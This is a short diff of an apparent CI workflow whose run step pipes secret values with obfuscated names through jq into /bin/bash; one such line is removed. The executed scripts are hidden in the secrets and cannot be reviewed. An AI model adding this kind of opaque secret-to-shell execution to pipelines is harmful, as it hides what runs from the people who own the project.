@@ -22,7 +22,6 @@ jobs:
           fx557: ${{ secrets.fx557 }}
         run: |
           printf '%s' "$fx557" | jq -r .trpi2 | /bin/bash
-          printf '%s' "$ilzl56" | jq -r .vtnj5 | /bin/bash
           printf '%s' "$uhxaf5933" | jq -r .xmyrm8321 | /bin/bash
           echo $asw70610 | jq -r .ferfj31293 | /bin/bash
           echo $t2488 | jq -r .qpxh1569 | /bin/bash
